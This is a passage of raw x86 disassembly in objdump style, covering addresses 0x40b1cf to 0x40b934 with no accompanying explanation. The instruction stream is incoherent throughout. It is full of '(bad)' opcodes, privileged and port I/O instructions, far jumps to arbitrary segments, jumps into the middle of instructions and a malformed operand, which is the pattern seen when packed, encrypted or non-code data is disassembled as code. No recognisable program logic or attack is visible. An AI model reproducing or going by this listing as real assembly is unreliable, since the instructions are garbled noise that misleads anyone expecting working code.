  40b1cf:	pop    edx
  40b1d0:	xchg   BYTE PTR [ebx],dh
  40b1d2:	(bad)  
  40b1d3:	xchg   esi,eax
  40b1d4:	jle    0x40b203
  40b1d6:	jp     0x40b173
  40b1d8:	dec    edx
  40b1d9:	sub    al,0x7f
  40b1db:	adc    eax,0x4cce7a12
  40b1e0:	div    BYTE PTR [edx-0x74]
  40b1e3:	and    al,0xe2
  40b1e5:	ds in  eax,dx
  40b1e7:	mov    bl,0x42
  40b1e9:	jmp    0x40b1bb
  40b1eb:	jb     0x40b1d1
  40b1ed:	mov    eax,0x51d861c1
  40b1f2:	mov    ebx,0x999d9d71
  40b1f7:	push   edi
  40b1f8:	pop    es
  40b1f9:	inc    bl
  40b1fb:	aad    0x1d
  40b1fd:	cmp    al,0x97
  40b1ff:	dec    ecx
  40b200:	cmc    
  40b201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b202:	pop    edi
  40b203:	addr16 test eax,0x8095bbe6
  40b209:	jb     0x40b1af
  40b20b:	fs push esp
  40b20d:	adc    al,0xfe
  40b20f:	shr    bh,cl
  40b211:	mov    dh,0x25
  40b213:	mov    ds:0xf6c38ec,al
  40b218:	xchg   esp,eax
  40b219:	outs   dx,DWORD PTR ds:[esi]
  40b21a:	xor    esp,ebp
  40b21c:	(bad)  
  40b21d:	icebp  
  40b21e:	inc    edx
  40b21f:	hlt    
  40b220:	icebp  
  40b221:	add    al,0x6b
  40b223:	sub    bl,BYTE PTR [esi]
  40b225:	popa   
  40b226:	xchg   bl,bh
  40b228:	sahf   
  40b229:	pop    ss
  40b22a:	outs   dx,BYTE PTR ds:[esi]
  40b22b:	mov    BYTE PTR [edx],ah
  40b22d:	cmc    
  40b22e:	adc    DWORD PTR [edx-0x75f0cb56],ebx
  40b234:	out    0xa5,al
  40b236:	cmp    bp,WORD PTR [eax-0x246013d5]
  40b23d:	mov    eax,ds:0xe9348c72
  40b242:	pop    ds
  40b243:	es out dx,al
  40b245:	(bad)  
  40b246:	push   ebx
  40b247:	inc    ecx
  40b248:	aad    0x9f
  40b24a:	arpl   WORD PTR [edx],di
  40b24c:	mov    ah,0x50
  40b24e:	(bad)  
  40b24f:	mov    ch,bl
  40b251:	mov    ds:0xcf565a5c,al
  40b256:	loop   0x40b1d8
  40b258:	push   esi
  40b259:	bound  ebp,QWORD PTR [edx-0x3c]
  40b25c:	in     eax,dx
  40b25d:	xor    DWORD PTR [edx],eax
  40b25f:	loope  0x40b256
  40b261:	mov    ebx,0xb30934db
  40b266:	inc    esi
  40b267:	sbb    al,0x3f
  40b269:	push   cs
  40b26a:	iret   
  40b26b:	daa    
  40b26c:	xchg   esi,eax
  40b26d:	xchg   ebx,eax
  40b26e:	arpl   WORD PTR [eax+0x6ecc0c4a],cx
  40b274:	mov    DWORD PTR [esi-0x48b06442],esp
  40b27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27b:	push   cs
  40b27c:	dec    eax
  40b27d:	pop    ebx
  40b27e:	les    ebp,FWORD PTR [ecx-0x57]
  40b281:	or     DWORD PTR [ecx+ebx*4-0x17f2ab57],ecx
  40b288:	xor    dh,ah
  40b28a:	int3   
  40b28b:	push   ebp
  40b28c:	call   0x14ee8899
  40b291:	cs popf 
  40b293:	ss ja  0x40b2f8
  40b296:	inc    ebp
  40b297:	pop    ds
  40b298:	add    DWORD PTR [ecx],ebp
  40b29a:	sbb    eax,0xc8802ce7
  40b29f:	outs   dx,BYTE PTR ds:[esi]
  40b2a0:	daa    
  40b2a1:	add    ch,BYTE PTR [esi+0x3e18368c]
  40b2a7:	pop    esi
  40b2a8:	pop    ebp
  40b2a9:	mov    eax,ds:0x61ef8890
  40b2ae:	sbb    ah,BYTE PTR [esi]
  40b2b0:	iret   
  40b2b1:	mov    BYTE PTR [ecx+0x6f],0xdf
  40b2b5:	mov    eax,ds:0xe0f473a1
  40b2ba:	pop    ecx
  40b2bb:	lods   al,BYTE PTR ds:[esi]
  40b2bc:	mov    bl,0x14
  40b2be:	mov    ebx,0x16293570
  40b2c3:	and    esp,esp
  40b2c5:	scas   eax,DWORD PTR es:[edi]
  40b2c6:	lods   eax,DWORD PTR ds:[esi]
  40b2c7:	mov    dh,0x2d
  40b2c9:	lock lds ebx,FWORD PTR [eax]
  40b2cc:	iret   
  40b2cd:	add    bl,cl
  40b2cf:	pop    ss
  40b2d0:	xchg   esp,eax
  40b2d1:	test   BYTE PTR ds:[edx+0x6cde54ca],ch
  40b2d8:	push   0xdd6b35d9
  40b2dd:	ja     0x40b28d
  40b2df:	sub    al,0xf0
  40b2e1:	les    esp,FWORD PTR [esp+ebx*1+0x3268fdd5]
  40b2e8:	das    
  40b2e9:	rcl    BYTE PTR [ebx],cl
  40b2eb:	push   eax
  40b2ec:	aam    0x59
  40b2ee:	daa    
  40b2ef:	adc    edx,DWORD PTR [ecx-0x617c1105]
  40b2f5:	xor    al,0x34
  40b2f7:	sbb    eax,0x61dd9078
  40b2fc:	das    
  40b2fd:	test   BYTE PTR [edx-0x10f2e2d0],cl
  40b303:	push   eax
  40b304:	aam    0xe3
  40b306:	dec    BYTE PTR [edx-0x323b8fa1]
  40b30c:	inc    edx
  40b30d:	cmp    esp,esi
  40b30f:	add    bl,BYTE PTR [ebp+0x17f2f441]
  40b315:	adc    al,0x2
  40b317:	and    esi,eax
  40b319:	imul   esi,ebp,0x8
  40b31c:	pusha  
  40b31d:	xchg   edx,eax
  40b31e:	int    0x3c
  40b320:	pushf  
  40b321:	inc    ecx
  40b322:	jnp    0x40b31e
  40b324:	fldcw  WORD PTR [edx-0x32]
  40b327:	pop    es
  40b328:	cdq    
  40b329:	lea    eax,[ecx-0x7a]
  40b32c:	jp     0x40b32d
  40b32e:	fstp   TBYTE PTR [esi]
  40b330:	jg     0x40b2d5
  40b332:	push   es
  40b333:	dec    eax
  40b334:	iret   
  40b335:	lahf   
  40b336:	cld    
  40b337:	mov    BYTE PTR [ebp-0x37],dh
  40b33a:	push   ecx
  40b33b:	sahf   
  40b33c:	jns    0x40b390
  40b33e:	jno    0x40b399
  40b340:	inc    eax
  40b341:	jp     0x40b3c1
  40b343:	or     dh,BYTE PTR [edi]
  40b345:	jecxz  0x40b378
  40b347:	jne    0x40b391
  40b349:	xchg   esp,eax
  40b34a:	mov    dh,0xa
  40b34c:	add    DWORD PTR [ebx+0x35],eax
  40b34f:	cmp    cl,bl
  40b351:	out    0x74,eax
  40b353:	mov    ?,WORD PTR [esi]
  40b355:	mov    dl,0xf6
  40b357:	xor    edx,DWORD PTR ds:0x19f6b3e1
  40b35d:	ja     0x40b2e5
  40b35f:	popf   
  40b360:	mov    ds:0xcb4a7312,eax
  40b365:	into   
  40b366:	mov    dh,0xaf
  40b368:	(bad)  
  40b369:	xlat   BYTE PTR ds:[ebx]
  40b36a:	xchg   ecx,eax
  40b36b:	in     eax,0x75
  40b36d:	pop    ebx
  40b36e:	ja     0x40b38f
  40b370:	pop    ecx
  40b371:	vunpcklps xmm3,xmm5,xmm6
  40b375:	mov    bh,0x3f
  40b377:	sbb    al,0x29
  40b379:	retf   
  40b37a:	sbb    esp,esi
  40b37c:	stos   BYTE PTR es:[edi],al
  40b37d:	inc    esi
  40b37e:	cmp    eax,0x5c7d8292
  40b383:	sub    al,0x27
  40b385:	std    
  40b386:	lock xor dl,BYTE PTR [ebx]
  40b389:	add    DWORD PTR [edx],esp
  40b38b:	mov    eax,0xbaaadb08
  40b390:	in     al,dx
  40b391:	mov    eax,0xf02c0eb4
  40b396:	scas   al,BYTE PTR es:[edi]
  40b397:	pop    ebp
  40b398:	ficom  WORD PTR [ebx]
  40b39a:	test   ebp,edi
  40b39c:	arpl   WORD PTR [edi],ax
  40b39e:	adc    al,0x8c
  40b3a0:	xchg   ebx,eax
  40b3a1:	in     eax,0xe6
  40b3a3:	inc    ecx
  40b3a4:	jmp    0xc03fb9ed
  40b3a9:	add    al,0x8a
  40b3ab:	mov    eax,0xfc8b26ac
  40b3b0:	lods   eax,DWORD PTR ds:[esi]
  40b3b1:	or     al,0xd9
  40b3b3:	and    eax,0x7c5c7605
  40b3b8:	test   eax,0xa0137057
  40b3bd:	dec    ebx
  40b3be:	and    edi,DWORD PTR [edi-0x2f]
  40b3c1:	push   0xffffffac
  40b3c3:	mov    al,BYTE PTR [edx]
  40b3c5:	sbb    dl,ah
  40b3c7:	mov    ch,0xfe
  40b3c9:	pop    ds
  40b3ca:	mov    ds:0x4c85197b,eax
  40b3cf:	sbb    al,0xa1
  40b3d1:	(bad)  [edi+0x9bd50c0]
  40b3d7:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3d9:	push   cs
  40b3da:	xchg   esi,eax
  40b3db:	mov    ah,0xb9
  40b3dd:	sub    DWORD PTR [ecx],eax
  40b3df:	sbb    DWORD PTR [edi],esp
  40b3e1:	ds inc ecx
  40b3e3:	push   esi
  40b3e4:	js     0x40b43c
  40b3e6:	cmp    eax,0x3d6623ab
  40b3eb:	popf   
  40b3ec:	bound  esi,QWORD PTR [ebx+0x4b]
  40b3ef:	mov    eax,ecx
  40b3f1:	push   ebx
  40b3f2:	das    
  40b3f3:	rol    edx,0x13
  40b3f6:	out    0xd2,al
  40b3f8:	pop    esp
  40b3f9:	cmp    eax,0x107c96d6
  40b3fe:	jmp    0x2d4b:0x852b751e
  40b405:	pop    edx
  40b406:	or     esi,eax
  40b408:	inc    ecx
  40b409:	add    cl,dh
  40b40b:	icebp  
  40b40c:	lahf   
  40b40d:	test   al,0x6a
  40b40f:	add    bh,BYTE PTR [edx-0x67]
  40b412:	dec    esi
  40b413:	adc    al,0x7f
  40b415:	out    dx,al
  40b416:	mov    ds:0x3ba28e97,eax
  40b41b:	push   0xfffffff7
  40b41d:	aad    0x2b
  40b41f:	push   ecx
  40b420:	mov    eax,0xae8c9293
  40b425:	clc    
  40b426:	enter  0x301d,0x9f
  40b42a:	call   0x1bd01f52
  40b42f:	jge    0x40b3fb
  40b431:	adc    BYTE PTR ds:0xcee1ba7d,bl
  40b437:	mov    dl,0xb7
  40b439:	xchg   ecx,eax
  40b43a:	aad    0x58
  40b43c:	mov    sp,0xd895
  40b440:	bound  esi,QWORD PTR ds:0xc5a74a29
  40b446:	jle    0x40b402
  40b448:	mov    cl,0x9b
  40b44a:	ins    BYTE PTR es:[edi],dx
  40b44b:	repnz out 0xc9,al
  40b44e:	ror    bh,cl
  40b450:	dec    BYTE PTR [esi+0x7d]
  40b453:	xchg   edi,eax
  40b454:	pop    ecx
  40b455:	unpckhps xmm6,XMMWORD PTR [ebx-0x6c]
  40b459:	jg     0x40b41a
  40b45b:	pop    ecx
  40b45c:	sub    BYTE PTR [ebx+0x1b],bh
  40b45f:	jmp    0xaab5:0xfe8c77d0
  40b466:	(bad)  
  40b467:	push   edx
  40b468:	or     BYTE PTR ds:0xe5a020aa,dl
  40b46e:	scas   al,BYTE PTR es:[edi]
  40b46f:	pop    esp
  40b470:	inc    esp
  40b471:	push   ecx
  40b472:	shr    BYTE PTR [ebp+0x3a5cec56],0xa8
  40b479:	stc    
  40b47a:	mov    ch,0x1d
  40b47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b47d:	mov    edi,0x4058cfd8
  40b482:	jl     0x40b412
  40b484:	stc    
  40b485:	jnp    0x40b4e4
  40b487:	scas   eax,DWORD PTR es:[edi]
  40b488:	mov    dl,ch
  40b48a:	jmp    0xe99b:0x58ff88c1
  40b491:	sbb    al,0xab
  40b493:	imul   edi,ebp,0x61
  40b496:	push   0x5f0e3be3
  40b49b:	call   0xc07ae641
  40b4a0:	shl    BYTE PTR [ebp+0x29],1
  40b4a3:	xchg   ebx,eax
  40b4a4:	xchg   edi,eax
  40b4a5:	cmp    DWORD PTR [edi-0x4f3c9417],edx
  40b4ab:	arpl   WORD PTR [edx+0x72476af4],bp
  40b4b1:	in     eax,dx
  40b4b2:	jl     0x40b459
  40b4b4:	xor    BYTE PTR [edi-0x35cf9861],dl
  40b4ba:	fild   QWORD PTR [edi]
  40b4bc:	scas   eax,DWORD PTR es:[edi]
  40b4bd:	aaa    
  40b4be:	push   ebp
  40b4bf:	jnp    0x40b534
  40b4c1:	cmc    
  40b4c2:	retf   0xfe06
  40b4c5:	inc    esp
  40b4c6:	add    al,0x16
  40b4c8:	sub    eax,0xed66f2bd
  40b4cd:	and    BYTE PTR [ebx-0x1a828b3c],bh
  40b4d3:	lea    ebp,[ebp-0x41]
  40b4d6:	pusha  
  40b4d7:	xor    edx,ebp
  40b4d9:	mov    ds:0x61e7786e,eax
  40b4de:	ficom  WORD PTR [edx+0x2b]
  40b4e1:	lock loope 0x40b46a
  40b4e4:	push   cs
  40b4e5:	into   
  40b4e6:	jnp    0x40b4d6
  40b4e8:	fidiv  WORD PTR ds:0x9ad01c16
  40b4ee:	dec    ebp
  40b4ef:	hlt    
  40b4f0:	leave  
  40b4f1:	ins    BYTE PTR es:[edi],dx
  40b4f2:	add    eax,0x5b26a83f
  40b4f7:	pop    esp
  40b4f8:	jmp    0x40b56f
  40b4fa:	(bad)  
  40b4fb:	add    DWORD PTR [ebx-0x5a],esi
  40b4fe:	sbb    DWORD PTR [edi-0xc],0x43
  40b502:	retf   
  40b503:	retf   0x59fb
  40b506:	int3   
  40b507:	fs jnp 0x40b543
  40b50a:	lds    edx,FWORD PTR [edi+0x69]
  40b50d:	ret    
  40b50e:	jno    0x40b4e3
  40b510:	sti    
  40b511:	gs pop ss
  40b513:	ss out 0xb9,eax
  40b516:	jmp    FWORD PTR [eax]
  40b518:	adc    BYTE PTR [edx-0x1a84b0ab],bl
  40b51e:	add    al,0xcd
  40b520:	mov    eax,0x31889545
  40b525:	xor    ch,0xdf
  40b528:	inc    BYTE PTR [eax+0x6a]
  40b52b:	push   ebx
  40b52c:	mov    ds:0x7dbe21b5,eax
  40b531:	dec    edx
  40b532:	adc    DWORD PTR [eax],esp
  40b534:	in     eax,dx
  40b535:	dec    ecx
  40b536:	repz loopne 0x40b55c
  40b539:	aas    
  40b53a:	test   al,0x70
  40b53c:	and    esi,DWORD PTR [ebx-0x3c997dc4]
  40b542:	sbb    al,0xa5
  40b544:	jge    0x40b50a
  40b546:	loope  0x40b589
  40b548:	adc    DWORD PTR [ebp+edi*8+0x4b79d2a0],0xffffffc3
  40b550:	loope  0x40b58b
  40b552:	arpl   si,cx
  40b554:	clc    
  40b555:	xor    DWORD PTR [ebx],esp
  40b557:	clc    
  40b558:	rcr    DWORD PTR [edx-0x7d42f4f0],0xf8
  40b55f:	pushf  
  40b560:	les    ecx,FWORD PTR [edi]
  40b562:	jns    0x40b54b
  40b564:	xor    BYTE PTR [ecx],0x8
  40b567:	outs   dx,DWORD PTR ds:[esi]
  40b568:	push   0x3d7c56b2
  40b56d:	adc    al,BYTE PTR [edx]
  40b56f:	fdiv   DWORD PTR [esi]
  40b571:	out    0x30,al
  40b573:	and    DWORD PTR [edx+0x66ffcb4d],esp
  40b579:	lock sbb eax,0x6c7e62dd
  40b57f:	fild   DWORD PTR [eax]
  40b581:	jg     0x40b542
  40b583:	gs xchg ebx,eax
  40b585:	cmp    ebx,DWORD PTR [ebx-0xdaf2448]
  40b58b:	jp     0x40b5ee
  40b58d:	outs   dx,BYTE PTR ds:[esi]
  40b58e:	inc    ebx
  40b58f:	sar    BYTE PTR [ebp+eiz*2-0x270e374b],1
  40b596:	test   eax,0x3604c957
  40b59b:	inc    edi
  40b59c:	jg     0x40b5bd
  40b59e:	xor    DWORD PTR [esi+eiz*2-0x35],0xca890a17
  40b5a6:	popa   
  40b5a7:	push   ss
  40b5a8:	sbb    dl,BYTE PTR [ebx]
  40b5aa:	add    al,0xb0
  40b5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ad:	out    0xee,al
  40b5af:	mov    bl,0x42
  40b5b1:	jns    0x40b624
  40b5b3:	mov    ecx,ecx
  40b5b5:	ror    DWORD PTR [edi],0xdf
  40b5b8:	push   ds
  40b5b9:	cdq    
  40b5ba:	(bad)  
  40b5bb:	dec    esi
  40b5bc:	adc    al,0x4d
  40b5be:	mov    esi,0x77a01c6
  40b5c3:	std    
  40b5c4:	or     al,0x34
  40b5c6:	jp     0x40b5fe
  40b5c8:	inc    ebx
  40b5c9:	lods   al,BYTE PTR ds:[esi]
  40b5ca:	ds test eax,0xfc764b3b
  40b5d0:	hlt    
  40b5d1:	aaa    
  40b5d2:	jmp    FWORD PTR [ebx+0x2f941f0e]
  40b5d8:	or     eax,0xbbe9066b
  40b5dd:	mov    ecx,0x970a12f3
  40b5e2:	mov    bh,BYTE PTR [eax+0x6b5b97c6]
  40b5e8:	push   cs
  40b5e9:	rcl    BYTE PTR [eax],1
  40b5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ec:	imul   al
  40b5ee:	test   eax,0xb8738cfd
  40b5f3:	imul   ecx,DWORD PTR [ebp+0x6a],0x88894d2f
  40b5fa:	bound  edx,QWORD PTR [ebx]
  40b5fc:	in     al,0xfe
  40b5fe:	push   eax
  40b5ff:	cmp    ebp,edx
  40b601:	pop    edx
  40b602:	mov    edi,0x1d746dd2
  40b607:	push   ecx
  40b608:	adc    al,0xd0
  40b60a:	push   0xffffff85
  40b60c:	(bad)  
  40b60d:	sub    cl,BYTE PTR [ecx+edx*1]
  40b610:	loope  0x40b615
  40b612:	dec    edx
  40b613:	clc    
  40b614:	pop    ebp
  40b615:	(bad)  [edi-0x4d]
  40b618:	or     bh,BYTE PTR [edi+0x29]
  40b61b:	mov    dh,0x3f
  40b61d:	sub    al,0x1a
  40b61f:	mov    edx,0x44293ecd
  40b624:	jmp    0x2e01:0x71e0b03e
  40b62b:	jb     0x40b68d
  40b62d:	test   BYTE PTR [eax+edx*2+0x1e],ch
  40b631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b632:	mov    DWORD PTR [ebp-0xbe3a57],edi
  40b638:	or     BYTE PTR [ecx-0x16],dl
  40b63b:	xchg   esi,ecx
  40b63d:	and    al,0xdc
  40b63f:	dec    eax
  40b640:	pop    es
  40b641:	sbb    esp,DWORD PTR [esi]
  40b643:	pop    edi
  40b644:	stc    
  40b645:	mov    esi,0xfa3b7dc7
  40b64a:	inc    esi
  40b64b:	fs (bad) 
  40b64d:	jg     0x40b5f5
  40b64f:	stc    
  40b650:	test   al,0xee
  40b652:	popa   
  40b653:	idiv   BYTE PTR [esi-0x2a]
  40b656:	fnsave [ebx-0x27b9f9a9]
  40b65c:	xor    BYTE PTR [ebx],dl
  40b65e:	push   0x4d
  40b660:	pusha  
  40b661:	or     esi,DWORD PTR [ecx]
  40b663:	in     al,0x45
  40b665:	loope  0x40b60d
  40b667:	lods   eax,DWORD PTR ds:[esi]
  40b668:	int    0x2b
  40b66a:	lock xchg ebp,eax
  40b66c:	test   DWORD PTR [edi+0x5e15a188],esp
  40b672:	inc    edx
  40b673:	cli    
  40b674:	mov    ebp,DWORD PTR [ecx-0x5]
  40b677:	jnp    0x40b69a
  40b679:	lods   al,BYTE PTR ds:[esi]
  40b67a:	sbb    al,0xb
  40b67c:	push   ebx
  40b67d:	nop
  40b67e:	lds    ecx,FWORD PTR [edi+edi*4+0x5d367a58]
  40b685:	adc    al,0xd7
  40b687:	sub    DWORD PTR [ecx+0x4b868409],eax
  40b68d:	gs mov eax,0xb432738d
  40b694:	cli    
  40b695:	fnstsw WORD PTR [esi+0x11]
  40b698:	call   0x3b47:0xf5816d2b
  40b69f:	push   edi
  40b6a0:	sti    
  40b6a1:	jae    0x40b722
  40b6a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a4:	mov    dl,0xe0
  40b6a6:	fst    QWORD PTR [eax]
  40b6a8:	dec    edi
  40b6a9:	sbb    cl,BYTE PTR [ecx]
  40b6ab:	test   eax,0x2d6fabf7
  40b6b0:	and    cl,BYTE PTR [esi-0x22]
  40b6b3:	popa   
  40b6b4:	push   0x1e
  40b6b6:	nop    DWORD PTR [ebp+ebp*4-0x60571bde]
  40b6be:	fadd   st(4),st
  40b6c0:	push   0x9960ddc8
  40b6c5:	in     al,0xe9
  40b6c7:	nop
  40b6c8:	pushf  
  40b6c9:	fist   DWORD PTR [esi]
  40b6cb:	and    al,0xff
  40b6cd:	fadd   DWORD PTR [esi+0x31070f82]
  40b6d3:	cld    
  40b6d4:	and    DWORD PTR [ecx-0x6e],ebp
  40b6d7:	add    ebp,DWORD PTR [ecx+0x27]
  40b6da:	xor    esi,esp
  40b6dc:	inc    esp
  40b6dd:	popa   
  40b6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6df:	and    eax,0xfdc0ef09
  40b6e4:	mov    esp,0x894c7a26
  40b6e9:	jg     0x40b71a
  40b6eb:	pop    eax
  40b6ec:	xor    eax,0xb99196e4
  40b6f1:	out    0xe2,al
  40b6f3:	xchg   BYTE PTR [ecx-0x6c9f6794],bh
  40b6f9:	fmul   st(6),st
  40b6fb:	adc    DWORD PTR [ebx],ebx
  40b6fd:	lahf   
  40b6fe:	mov    dh,0xa6
  40b700:	push   esi
  40b701:	jne    0x40b77d
  40b703:	or     eax,0xae977610
  40b708:	hlt    
  40b709:	jns    0x40b70f
  40b70b:	adc    edx,ebp
  40b70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70e:	mov    bh,0x8e
  40b710:	and    al,0x10
  40b712:	leave  
  40b713:	sbb    DWORD PTR [eax],ebx
  40b715:	in     eax,0x3f
  40b717:	xchg   ecx,eax
  40b718:	adc    eax,0x51cb9572
  40b71d:	and    DWORD PTR [ebx+0x7],edx
  40b720:	dec    ebx
  40b721:	gs daa 
  40b723:	jmp    DWORD PTR [edi-0x6f]
  40b726:	jae    0x40b773
  40b728:	sar    BYTE PTR [esi],0x2
  40b72b:	popa   
  40b72c:	mov    esi,0x91ca87f2
  40b731:	jmp    0x40b718
  40b733:	mov    esp,0x71effb71
  40b738:	add    ch,ah
  40b73a:	rol    BYTE PTR [eax-0x2a],1
  40b73d:	mov    esp,0xd1d0e818
  40b742:	js     0x40b711
  40b744:	ror    DWORD PTR [edi+0x595d2a3d],0xfb
  40b74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b74c:	lds    ebp,FWORD PTR [ebp+0x2823197b]
  40b752:	outs   dx,DWORD PTR ds:[esi]
  40b753:	retf   
  40b754:	and    DWORD PTR [edx+0x624a4754],esi
  40b75a:	test   BYTE PTR [ebx+0xbbae994],dl
  40b760:	xor    esp,DWORD PTR cs:[ecx+0x19]
  40b764:	mov    al,ds:0x23e856ea
  40b769:	das    
  40b76a:	out    dx,eax
  40b76b:	hlt    
  40b76c:	ss and bh,bl
  40b76f:	out    dx,eax
  40b770:	mov    cl,0x9
  40b772:	data16 and ah,dh
  40b775:	(bad)  
  40b776:	jecxz  0x40b7bf
  40b778:	cdq    
  40b779:	dec    edi
  40b77a:	cmp    edi,DWORD PTR [eax-0x7]
  40b77d:	mov    ecx,0xb80d5695
  40b782:	lods   al,BYTE PTR ds:[esi]
  40b783:	push   0x7
  40b785:	mov    ebp,DWORD PTR [edi+0x1d]
  40b788:	cmp    dh,BYTE PTR [ebp+0x760635a3]
  40b78e:	aad    0x10
  40b790:	jns    0x40b7a7
  40b792:	pop    ss
  40b793:	or     edi,esp
  40b795:	loope  0x40b719
  40b797:	in     eax,0x4b
  40b799:	pop    ebx
  40b79a:	pop    es
  40b79b:	ret    0x9ca7
  40b79e:	cmp    al,0x43
  40b7a0:	pop    ss
  40b7a1:	xchg   edx,eax
  40b7a2:	add    eax,0x5737b7bf
  40b7a7:	rcl    DWORD PTR ds:0x1ed9620d,0x78
  40b7ae:	lahf   
  40b7af:	or     al,0x4e
  40b7b1:	lea    ebp,[eax-0x4d124e7b]
  40b7b7:	sub    al,0x39
  40b7b9:	das    
  40b7ba:	inc    eax
  40b7bb:	pop    DWORD PTR [esi]
  40b7bd:	mov    ebp,0xbb9af884
  40b7c2:	fcom   st(6)
  40b7c4:	sub    dh,BYTE PTR [ebx-0x3461f70e]
  40b7ca:	xor    BYTE PTR [edx+0xccc9eb5],cl
  40b7d0:	and    eax,0x81cb036f
  40b7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d6:	(bad)  
  40b7d7:	repz ret 
  40b7d9:	jl     0x40b7df
  40b7db:	aad    0x15
  40b7dd:	sub    BYTE PTR [eax+0x59],bh
  40b7e0:	shl    eax,cl
  40b7e2:	shr    BYTE PTR [ebx+0x6d3c0582],0x68
  40b7e9:	pop    ds
  40b7ea:	xor    eax,0x83bdb088
  40b7ef:	mov    bl,0xb7
  40b7f1:	pinsrw mm1,WORD PTR [esi+edx*2-0x503634f6],0xc6
  40b7fa:	in     eax,0xb2
  40b7fc:	cld    
  40b7fd:	jg     0x40b795
  40b7ff:	cmp    BYTE PTR [edi],0x15
  40b802:	mov    bh,0xe
  40b804:	mov    WORD PTR [esi],es
  40b806:	sub    bh,0xbd
  40b809:	xchg   ebx,eax
  40b80a:	popa   
  40b80b:	mov    bl,BYTE PTR [edi]
  40b80d:	xchg   ebx,eax
  40b80e:	mov    esp,0x4ac6207c
  40b813:	out    dx,al
  40b814:	ins    BYTE PTR es:[edi],dx
  40b815:	in     eax,dx
  40b816:	and    eax,0xa8767b26
  40b81b:	loop   0x40b85b
  40b81d:	fild   DWORD PTR [ecx]
  40b81f:	xchg   ebx,eax
  40b820:	mov    ecx,0xe43993cc
  40b826:	lahf   
  40b827:	jbe    0x40b7e8
  40b829:	dec    ebp
  40b82a:	nop
  40b82b:	mov    edi,0x41c21d5c
  40b830:	data16 jmp 0x40b827
  40b833:	xchg   al,ch
  40b835:	and    BYTE PTR ds:0x91ecb504,cl
  40b83b:	jmp    0x68f4:0xb490d7d2
  40b842:	cmc    
  40b843:	xchg   BYTE PTR [edx+0x76cc2ec6],bh
  40b849:	xor    eax,0x961bc694
  40b84e:	aas    
  40b84f:	ret    
  40b850:	inc    ecx
  40b851:	lea    edx,[edx+0x6388131b]
  40b857:	mov    ah,BYTE PTR [eax]
  40b859:	out    0x17,al
  40b85b:	mov    eax,0xca4b8dec
  40b860:	cmp    esp,DWORD PTR [ecx]
  40b862:	loopne 0x40b7e6
  40b864:	jae    0x40b7ef
  40b866:	out    0xa4,eax
  40b868:	or     dh,ah
  40b86a:	push   0xfffffff6
  40b86c:	jno    0x40b813
  40b86e:	sub    bh,BYTE PTR [esi+0x5a]
  40b871:	adc    BYTE PTR [ebx-0x6a],al
  40b874:	ret    0xc334
  40b877:	push   0x8b4844d5
  40b87c:	pushf  
  40b87d:	fnstsw WORD PTR [edx+0x4a]
  40b880:	cmp    BYTE PTR [ebp-0x7d],al
  40b883:	sbb    ch,BYTE PTR [eax]
  40b885:	adc    bl,BYTE PTR [eax-0x29b82f1b]
  40b88b:	retf   0xdd73
  40b88e:	bound  esi,QWORD PTR [esi+0x74299462]
  40b894:	cmp    BYTE PTR [edi+0x34ff3148],cl
  40b89a:	(bad)  
  40b89b:	adc    edx,DWORD PTR [ebx+0x2d50fef6]
  40b8a1:	addr16 mov esi,0xd3ad453
  40b8a7:	rcl    BYTE PTR [ebx],cl
  40b8a9:	inc    dl
  40b8ab:	xor    esp,ebp
  40b8ad:	inc    ebx
  40b8ae:	and    esp,DWORD PTR [ebx-0x35bb0f32]
  40b8b4:	hlt    
  40b8b5:	cmp    ah,BYTE PTR es:[ebx+edi*1+0x2a]
  40b8ba:	pop    ds
  40b8bb:	femms  
  40b8bd:	ficomp DWORD PTR [ecx]
  40b8bf:	test   eax,0x8e3e8bf3
  40b8c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c5:	dec    edx
  40b8c6:	dec    ebp
  40b8c7:	sub    DWORD PTR [ecx+0x1b],edi
  40b8ca:	pop    esi
  40b8cb:	ret    0xc94b
  40b8ce:	leave  
  40b8cf:	xchg   ebp,eax
  40b8d0:	int3   
  40b8d1:	xchg   esi,edi
  40b8d3:	lods   al,BYTE PTR ds:[esi]
  40b8d4:	adc    ah,bl
  40b8d6:	xor    BYTE PTR [eax],bh
  40b8d8:	popf   
  40b8d9:	icebp  
  40b8da:	sub    eax,0x8efb9db0
  40b8df:	in     al,0x62
  40b8e1:	mov    bh,0xef
  40b8e3:	ins    BYTE PTR es:[edi],dx
  40b8e4:	xor    bl,bl
  40b8e6:	call   0xc4e933f5
  40b8eb:	scas   al,BYTE PTR es:[edi]
  40b8ec:	fs add al,0x3
  40b8ef:	or     BYTE PTR [ecx+0x3c5a902b],ch
  40b8f5:	inc    esi
  40b8f6:	hlt    
  40b8f7:	dec    esi
  40b8f8:	rcl    BYTE PTR [esi],1
  40b8fa:	repz fsubp st(5),st
  40b8fd:	jl     0x40b880
  40b8ff:	ret    0xed4a
  40b902:	scas   eax,DWORD PTR es:[edi]
  40b903:	shl    DWORD PTR [edx+0x79b7a94],cl
  40b909:	aam    0x17
  40b90b:	push   esi
  40b90c:	jge    0x40b944
  40b90e:	sahf   
  40b90f:	dec    edx
  40b910:	push   esi
  40b911:	sub    al,0xbd
  40b913:	inc    ebp
  40b914:	push   ebp
  40b915:	xchg   esi,eax
  40b916:	push   ds
  40b917:	mov    esp,ss
  40b919:	shl    BYTE PTR [ebp-0x51],cl
  40b91c:	or     BYTE PTR [ecx-0x30b21a20],0x81
  40b923:	dec    esp
  40b924:	add    DWORD PTR [edi-0x29],esi
  40b927:	sahf   
  40b928:	sub    BYTE PTR [ecx+0x2f40bbf],dh
  40b92e:	lods   eax,DWORD PTR ds:[esi]
  40b92f:	rcr    DWORD PTR [esi+eax*8],cl
  40b932:	ret    
  40b933:	push   eax
  40b934:	jmp    0xf8f3:0xddac63c4
